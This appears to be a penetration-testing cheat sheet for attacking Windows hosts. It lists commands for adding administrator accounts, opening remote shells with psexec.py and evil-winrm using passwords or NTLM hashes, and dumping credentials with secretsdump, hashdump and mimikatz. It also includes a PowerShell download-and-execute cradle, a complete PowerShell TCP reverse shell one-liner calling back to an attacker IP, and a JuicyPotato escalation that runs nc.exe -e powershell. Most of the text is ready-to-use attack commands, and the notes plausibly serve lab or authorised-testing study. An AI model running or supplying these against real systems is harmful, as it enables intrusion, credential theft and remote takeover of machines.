# Windows

## System commmands
| Command | Why |
| - | - |
| systeminfo | To get windows version and other useful information. |
| whoami /priv | View permissions. |

## File locations
| Path | Why |
| - | - |
| C:\ or other system roots | Always worth checking.
| C:\Users{\Administrator\ | Check out the users folders. |
| C:\User\[anyuser]\AppData | Lots of interesting stuff. |
| C:\Users\[anyuser]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine | Check for file 'ConsoleHost_history.txt', PS command history. |
| C:\Windows\system32\config\sam | Location of the SAM password database. |
| C:\Windows\system32\cmd.exe | For usage in scripts etc. |
| C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe | Location of powershell, for usage in scripts etc. |
| C:\Windws\temp | Usually writeable globally. |
| C:\Windows\system32\drivers\etc\hosts | Hosts file. |
| C:\Windows\System32\spool\drivers\color | By default whitelisted dir(Applocker). |

## cmd
```
type [filename]
sc [stop | start] *servicename*
sc qc *servicename
icacls *dirpath*
net user *username* *password* /add
net localgroup administrators *username* /add
```
### CMD paths
| Path | What |
| %userprofile% | Current user profile path. |
|   |   |

## Connecting remotely
### Impacket
A collection of networking tools from SecureAuth.

- [Github](https://github.com/SecureAuthCorp/impacket)
- [About impacket](https://www.secureauth.com/labs/open-source-tools/impacket/)

`pip3 install impacket`

**psexec.py**

Will land you a psexec-like shell if possible.

```
psexec.py [domain]/[username]:[password]@[targetip]
psexec.py [domain]/[username]@[targetip] -hashes [NTLM-hash]
```

More impacket tools under [Credentials](#credentials).
### evil-winrm
Gets you a WinRM shell.

- [Github](https://github.com/Hackplayers/evil-winrm)

`gem install evil-winrm`

```
evil-winrm -i [targetip] -u [username] -p [password]
evil-winrm -i [targetip] -u [username] -H [NT-hash]
```

## Credentials
**secretsdump.py (impacket)**

Can dump hashes and plaintext passwords remotely.

`secretsdump.py [domain]/[username]:[password]@[targetip] -dc-ip [dcip]`

**msf meterpreter**
`hashdump`

### mimikatz
Can be used to extract passwords, hashes, tickets etc.

- [Github](https://github.com/gentilkiwi/mimikatz/wiki)

Runs on target, upload binary and run.

```
sekurlsa::logonpasswords
```

## Reverse shell
### PowerShell
Retrieve and run a powershell script from your webserver:

`powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");`

shell.ps1:Get-Service | Where-Object {$_.Status -eq "Running"}

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.37',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Vulnerability scanning
### Windows exploit suggester
- [windows-exploit-suggester(python3 fork)](https://github.com/1uffyD9/Windows-Exploit-Suggester)
- [original github using python2](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)


## Privilege escalation
- [Abusing tokens](https://www.exploit-db.com/papers/42556)
- [Docs about access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

### JuicyPotato
[Github](https://github.com/ohpe/juicy-potato)

**Create a remote shell**
Requires nc.exe.

`.\juicypotato.exe -l 1234 -p script.bat -t [* | t | u]`

Create the script on the host with:

`echo START C:\<pathtofolder\nc.exe -e powershell [ip] [port] > script.bat`

t-option:

![t-option](assets/markdown-img-paste-20210821204619795.png)

[cls-ids](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) in case you need it.

## nishang
https://github.com/samratashok/nishang

```
pwsh
import-module .\nishang.psm1
Get-Information
```

## PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

`Invoke-AllChecks`
